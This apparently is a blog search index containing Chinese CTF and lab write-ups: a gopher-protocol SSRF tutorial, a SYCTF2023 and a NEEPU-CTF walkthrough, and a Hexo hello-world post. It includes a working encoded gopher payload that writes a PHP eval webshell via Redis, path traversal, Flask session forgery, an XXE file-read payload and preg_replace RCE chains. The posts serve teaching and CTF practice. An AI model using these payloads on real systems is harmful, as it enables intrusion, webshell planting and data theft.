    <entry>
      <title></title>
      <link href="/2024/01/22/gopher%E5%8D%8F%E8%AE%AE/"/>
      <url>/2024/01/22/gopher%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h1><h2 id="什么是gopher协议"><a href="#什么是gopher协议" class="headerlink" title="什么是gopher协议"></a>什么是gopher协议</h2><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p><blockquote><p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p></blockquote><p>但是gopher协议在各个语言中是有使用限制的。</p><table><thead><tr><th align="center">语言</th><th align="center">支持情况</th></tr></thead><tbody><tr><td align="center">PHP</td><td align="center">–wite-curlwrappers且php版本至少为5.3</td></tr><tr><td align="center">Java</td><td align="center">小于JDK1.7</td></tr><tr><td align="center">Curl</td><td align="center">低版本不支持</td></tr><tr><td align="center">Perl</td><td align="center">支持</td></tr><tr><td align="center">ASP.NET</td><td align="center">小于版本3</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--wite-curlwrappers：运用curl工具打开url流</span><br><span class="line">curl使用curl --version查看版本以及支持的协议</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230709103328078.png"></p><p>上面说的curl低版本不支持gopher协议，但是我的Windows上的curl8.0.1也不支持</p><h2 id="gopher协议格式"><a href="#gopher协议格式" class="headerlink" title="gopher协议格式"></a>gopher协议格式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure><ul><li>gopher的默认端口是70</li><li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li></ul><h3 id="Gopher发送请求HTTP-GET请求："><a href="#Gopher发送请求HTTP-GET请求：" class="headerlink" title="Gopher发送请求HTTP GET请求："></a>Gopher发送请求HTTP GET请求：</h3><p>使用Gopher协议发送一个请求，环境为：nc起一个监听，curl发送gopher请求</p><p>这里我在Ubuntu上curl发送gopher请求，Windows上监听</p><p><img src="http://pic.bamboo22.top/image-20230709114819492.png"></p><p><img src="http://pic.bamboo22.top/image-20230709114836425.png"></p><p>可以看到nc收到gopher发出的请求，但是第一个字符被吃了，所以我们使用gopher协议发送请求的时候要在url前面加入任意一个字符</p><p><strong>在gopher协议中发送http的数据</strong></p><ol><li>构造HTTP数据包</li><li>URL编码、替换回车换行为%0d%0a</li><li>发送gopher协议</li></ol><p>下面就来本地测试一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>找一个get请求数据包，抓包获取http请求内容</p><p><img src="http://pic.bamboo22.top/image-20230709115933147.png"></p><p>我们需要的只有Host之前的内容</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/test.php?name=abc</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br></pre></td></tr></table></figure><p>将请求内容url编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.130.1:2222/GET%20%2Ftest.php%3Fname%3Dabc%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%0D%0A</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ol><li>问号（?）需要转码为URL编码，也就是%3f</li><li>回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</li><li>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</li></ol><p><img src="http://pic.bamboo22.top/image-20230709120806524.png"></p><p><img src="http://pic.bamboo22.top/image-20230709120819415.png"></p><h3 id="Gopher发送请求HTTP-POST请求："><a href="#Gopher发送请求HTTP-POST请求：" class="headerlink" title="Gopher发送请求HTTP POST请求："></a>Gopher发送请求HTTP POST请求：</h3><p>同样本地测试</p><p>先用htttp发一个post请求</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230709121501648.png"></p><p>用gopher协议发post请求必须的参数是</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test.php?name=abc</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>8</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"></span></span><br><span class="line"><span class="language-abnf"><span class="attribute">name</span><span class="operator">=</span>abc</span></span><br><span class="line"><span class="language-abnf"></span></span><br></pre></td></tr></table></figure><p>URL编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.130.1:2222/_POST%20%2Ftest.php%3Fname%3Dabc%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%208%0D%0A%0D%0Aname%3Dabc%0D%0A</span><br></pre></td></tr></table></figure><p><strong>同样也需要将回车换行改为%0D%0A</strong></p><p><img src="http://pic.bamboo22.top/image-20230709122527643.png"></p><p><img src="http://pic.bamboo22.top/image-20230709122512471.png"></p><h2 id="利用gopher打redis"><a href="#利用gopher打redis" class="headerlink" title="利用gopher打redis"></a>利用gopher打redis</h2><p>先写一个含有ssrf的网页</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;there&#x27;s a ssrf in url，try it!&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230709172217577.png"></p><p>尝试输入百度，页面跳转</p><p><img src="http://pic.bamboo22.top/image-20230709172324389.png"></p><p>127.0.0.1，没有过滤</p><p><img src="http://pic.bamboo22.top/image-20230709172241142.png"></p><p>用dict可以直接探测靶机上的服务信息</p><p><img src="http://pic.bamboo22.top/image-20230709172548226.png"></p><p>攻击原理很简单，就是利用gopher协议模拟redis通信</p><p>接下来我们就来利用ssrf打reds，我们知道redis有好几种利用方式，这里我们就用写webshell来演示，其他的利用方式都是一样的原理</p><p>正常情况是连接攻击机的redis后执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set x &quot;\n\n\n&lt;?php @eval($_POST[&#x27;redis&#x27;]);?&gt;\n\n\n&quot;</span><br><span class="line">config set dir /www/admin/localhost_80/wwwroot  </span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>现在我们用gopher协议来模拟</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.144.130/123.php?url=gopher%3a%2f%2f127.0.0.1%3a6379%2f_%25%37%33%25%36%35%25%37%34%25%32%30%25%37%38%25%32%30%25%32%32%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%33%63%25%33%66%25%37%30%25%36%38%25%37%30%25%32%30%25%34%30%25%36%35%25%37%36%25%36%31%25%36%63%25%32%38%25%32%34%25%35%66%25%35%30%25%34%66%25%35%33%25%35%34%25%35%62%25%32%37%25%37%32%25%36%35%25%36%34%25%36%39%25%37%33%25%32%37%25%35%64%25%32%39%25%33%62%25%33%66%25%33%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%32%32%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%39%25%37%32%25%32%30%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%32%66%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34%25%35%66%25%33%38%25%33%30%25%32%66%25%37%37%25%37%37%25%37%37%25%37%32%25%36%66%25%36%66%25%37%34%25%32%30%25%32%30%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30%25%30%64%25%30%61%25%37%33%25%36%31%25%37%36%25%36%35</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230709214147910.png"></p><p>访问超时</p><p>但是可以看到，已经成功把马写进去了</p><p>（我这里测试的时候没有用root权限是写不进去的，所以应该要求redis是root权限打开）</p><p><img src="http://pic.bamboo22.top/image-20230709213950761.png"></p><p>蚁剑连接成功<br><img src="http://pic.bamboo22.top/image-20230709214220247.png"></p><p>其他的利用方式也就是在打redis时将redis的连接换成用gopher模拟连接</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/01/22/%5BSYCTF2023%5DCarelessPy/"/>
      <url>/2024/01/22/%5BSYCTF2023%5DCarelessPy/</url>
      
        <content type="html"><![CDATA[<h2 id="SYCTF2023-CarelessPy"><a href="#SYCTF2023-CarelessPy" class="headerlink" title="[SYCTF2023]CarelessPy"></a>[SYCTF2023]CarelessPy</h2><p><img src="http://pic.bamboo22.top/image-20230610132618291.png"></p><p>打开环境说下载图片，但其实没有什么用</p><p>查看源码，发现 <code>/eval </code>和 <code>/login </code></p><p><img src="http://pic.bamboo22.top/image-20230610132711588.png"></p><p>进入 <code>/eval </code>发现是一个命令执行，但是只要传cmd就会报错</p><p><img src="http://pic.bamboo22.top/image-20230610132912069.png"><br><img src="http://pic.bamboo22.top/image-20230610133109243.png"></p><p>进入<code>/login</code>有一个登录框，但是登录不成功</p><p><img src="http://pic.bamboo22.top/image-20230610133013051.png"></p><p><img src="http://pic.bamboo22.top/image-20230610133036210.png"></p><p>在&#x2F;login中猜测这个应该就是flask的session伪造，伪造一个成功登陆的cookie从而实现登录，那需要的秘应该就是在&#x2F;eval中去找</p><p>我们先去&#x2F;eval</p><p>这里一个一个传参去试（至于为什么我也不知道），试到app就成功了</p><p><img src="http://pic.bamboo22.top/image-20230610133620126.png"></p><p>进到这儿继续试</p><p><img src="http://pic.bamboo22.top/image-20230610133656260.png"></p><p>得到这个后就进入一开始的下载页面，就能下载.pyc文件，注意这里需要yong<code>../</code>进行目录穿越，因为要将工作目录转到网站更目录，所以要退三次</p><p><img src="http://pic.bamboo22.top/image-20230610140216067.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/eval?cmd=app</span><br><span class="line">/eval?cmd=app/__pycache__</span><br><span class="line">/download?file=../../..//app/__pycache__/part.cpython-311.pyc</span><br></pre></td></tr></table></figure><p>成功后就会下载一个.pyc文件，直接开是打不开的，改成.txt就可以看了（里面的乱码是没用的）</p><p><img src="http://pic.bamboo22.top/image-20230610141330544.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY:o2takuXX_donot_like_ntr</span><br></pre></td></tr></table></figure><p>找到秘钥</p><p>下面进到login界面，先登录失败，吧cookie复制下来</p><p><img src="http://pic.bamboo22.top/image-20230610142507231.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session；</span><br><span class="line">eyJpc2xvZ2luIjpmYWxzZX0.ZIQWEw.Ym12DU18w-DqMwu6aUkiOl36U38</span><br></pre></td></tr></table></figure><p>放到flask-session-manager里面去跑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -s <span class="string">&quot;o2takuXX_donot_like_ntr&quot;</span> -c <span class="string">&quot;eyJpc2xvZ2luIjpmYWxzZX0.ZIQWEw.Ym12DU18w-DqMwu6aUkiOl36U38&quot;</span></span><br><span class="line">&#123;<span class="string">&#x27;islogin&#x27;</span>: <span class="literal">False</span>&#125;</span><br><span class="line">python flask_session_cookie_manager3.py encode -s <span class="string">&quot;o2takuXX_donot_like_ntr&quot;</span> -t <span class="string">&quot;&#123;&#x27;islogin&#x27;: True&#125;&quot;</span></span><br><span class="line">eyJpc2xvZ2luIjp0cnVlfQ.ZIQZiQ.dcWvoUa9FO92Jdym53c9hHkeP2Q</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230610143508723.png"></p><p>将session的值改了之后就能成功登录了</p><p><img src="http://pic.bamboo22.top/image-20230610143643300.png"></p><p>进入&#x2F;th1s_1s_The_L4st_one看到XML，想到XXE漏洞，抓包</p><p><img src="http://pic.bamboo22.top/image-20230610170650880.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1     </span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE fumo [</span><br><span class="line">&lt;!ENTITY a SYSTEM &quot;file:///flag&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;fumo&gt;&lt;web&gt;&amp;a;</span><br><span class="line">&lt;/web&gt;&lt;/fumo&gt;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230610173502583.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/01/22/%5BNEEPU-CTF%202023%5Dezrce/"/>
      <url>/2024/01/22/%5BNEEPU-CTF%202023%5Dezrce/</url>
      
        <content type="html"><![CDATA[<h2 id="NEEPU-CTF-2023-ezrce"><a href="#NEEPU-CTF-2023-ezrce" class="headerlink" title="[NEEPU-CTF 2023]ezrce"></a>[NEEPU-CTF 2023]ezrce</h2><p><img src="http://pic.bamboo22.top/image-20230603163808883.png"></p><p>打开环境后看到提交框，随便输入点东西</p><p><img src="http://pic.bamboo22.top/image-20230603163906121.png"></p><p>可以看到源码</p><p><code>$name1=preg_replace(&#39;/hahaha/e&#39;,$qaq,$name);</code></p><p><code>/e</code>说明能当做php代码执行，所以尝试命令执行</p><p>开始传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://45e4936d.clsadp.com/?key=1223    //get</span><br><span class="line">name=hahaha&amp;qaq=system(ls);             //post</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230603165020984.png"></p><p>能够看到当前目录下的文件，但是ls更目录就看不到了，这里是<code>/</code>被过滤了</p><p>无参数rce</p><p>查看更目录下文件，其实就是构造一个<code>/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://45e4936d.clsadp.com/?key=1223</span><br><span class="line">name=hahaha&amp;qaq=print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</span><br></pre></td></tr></table></figure><p>因为获取<code>/</code>有随机性，多刷新几次</p><p><img src="http://pic.bamboo22.top/image-20230603165302185.png"></p><p>看到flag后就想办法构造读flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(array_flip(scandir(chr(ord(strrev(crypt(serialize(array()))))))));</span><br><span class="line">将键值切换</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(array_rand(array_flip(scandir(chr(ord(strrev(crypt(serialize(array()))))))));</span><br><span class="line">随机抽取数组中元素</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230603171138322.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(strrev(crypt(serialize(array()))))))));</span><br><span class="line">读文件</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230603172807967.png"></p><p>因为有随机性，放到burp里面去爆，根据响应长度来找<br>按理说应该这样就能找到了，但是实际操作时刷不出来flag，还没有解决这个问题</p><p>可以看到waf.php,看到里面过滤的东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$poc</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|get_defined_vars|getallheaders|next|prev|end|array_reverse|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$poc</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker! you die!&lt;br/&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;666&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$poc</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/01/21/hello-world/"/>
      <url>/2024/01/21/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
